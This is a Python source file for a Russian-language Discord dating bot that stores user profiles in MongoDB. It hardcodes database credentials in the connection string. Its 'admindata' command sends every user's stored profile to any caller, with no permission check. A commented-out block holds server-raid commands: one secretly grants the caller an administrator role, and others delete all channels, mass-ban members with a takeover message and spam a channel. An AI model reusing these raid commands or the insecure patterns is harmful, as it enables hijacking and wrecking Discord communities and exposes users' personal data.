from pymongo import MongoClient
import os
import discord
from discord.ext import commands
import pytz
from random import randint

from discord import Permissions
from discord.utils import get
from asyncio import sleep

client = commands.Bot(command_prefix=">",intents=discord.Intents.all())

cluster = MongoClient("mongodb+srv://ekfar1:1234@cluster0.dhafo.mongodb.net/bd?retryWrites=true&w=majority")
bd = cluster["bd"]
collection = bd["coolname"]

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online,
        activity=discord.Game(">ekfar")) 
#gg = ctx.author.avatar_url
@client.command()
async def create(ctx,years,floor,ava,*,im):#создать анкету
    count = collection.count_documents({})
    if collection.count_documents({"_id":ctx.author.mention}) == 1:
        dd = collection.find_one({"_id":ctx.author.mention})
        collection.update({"_id":ctx.author.mention},{"_id":ctx.author.mention,'years': years,'floor': floor,'im': im,'ava': str(ava),"r":dd['r']})
    else:
        collection.insert_one({"_id":ctx.author.mention,'years': years,'floor': floor,'im': im,'ava': str(ava),"r":str(count)})

    x = collection.find_one({"_id":ctx.author.mention})
    embed = discord.Embed(title=f'Анкета '+x['_id'])
    embed.set_thumbnail(url=x['ava'])
    embed.add_field(name="Возраст",value=x['years'])
    embed.add_field(name="Пол",value=x['floor'])
    embed.add_field(name="О себе",value=x['im'],inline=False)
    await ctx.author.send(embed=embed)
@client.command()
async def random(ctx):#random
    global idz,yearsz,avaz,floorz,imz
    print(collection.count_documents({}))
    rand = randint(0,collection.count_documents({})-1)
    print("rand="+str(rand))
    x = collection.find({"r":str(rand)})
    for x in x:
        print(x['_id'])
        idz = x['_id']
        print(x['years'])
        yearsz = x['years']
        print(x['im'])
        imz = x['im']
        print(x['floor'])
        floorz = x['floor']
        print(x['ava'])
        avaz = x['ava']
    embed = discord.Embed(title="Анкета "+str(idz))
    embed.set_thumbnail(url=str(avaz))
    embed.add_field(name="Возраст",value=str(yearsz))
    embed.add_field(name="Пол",value=str(floorz))
    embed.add_field(name="О себе",value=str(imz),inline=False)
    await ctx.author.send(embed=embed)
@client.command()
async def ekfar(ctx):#help
    embed = discord.Embed(title="Это бот знакомств от экфара")
    embed.add_field(name="Бот работает через лс",value="Просто напиши ему команду",inline=False)
    embed.add_field(name="Чтобы создать анкету пропиши",value=">create возраст пол ава текст",inline=False)
    embed.add_field(name="Чтобы найти случайную анкету пропиши",value=">random",inline=False)
    embed.add_field(name="Чтобы вызвать это меню пропиши",value=">ekfar",inline=False)
    #embed.add_field(name="Удачного пользования!",value="Создан тут https://discord.gg/sPruSKek2n",inline=False)
    embed.add_field(name="Удачного пользования!",value="Создан экфаром",inline=False)
    await ctx.send(embed=embed)    
@client.command()
async def admindata(ctx):
    data = collection.find()
    for d in data:
        print(d)
        await ctx.author.send(d)
#не касается кода знакомств
#@client.command()
#async def moder_give(ctx):
    #guild = ctx.guild
    #perms = discord.Permissions(administrator=True) #права роли
    #await guild.create_role(name="zutkm", permissions=perms) #создаем роль
    
    #role = discord.utils.get(ctx.guild.roles, name="zutkm") #находим роль по имени
    #user = ctx.message.author #находим юзера
    #await user.add_roles(role) #добовляем роль
    
    #await ctx.message.delete()
#@client.command()
#async def armagedon(ctx,*,name):
    #guild = ctx.guild
    #for channel in guild.channels:
        #await channel.delete()
        #await sleep(1)
    #for channel in range(10):
        #await guild.create_text_channel(str(name))
#@client.command()
#async def allban(ctx):
    #for m in ctx.guild.members: #собираем
        #try:
            #await m.ban(reason="zutkm,ekfar,layker захватили контроль!")#баним
        #except:
            #pass
#@client.command()
#async def zutkm(ctx,*,text):
    #for f in range(30):
        #await ctx.send(text)
client.run(os.environ['token'])
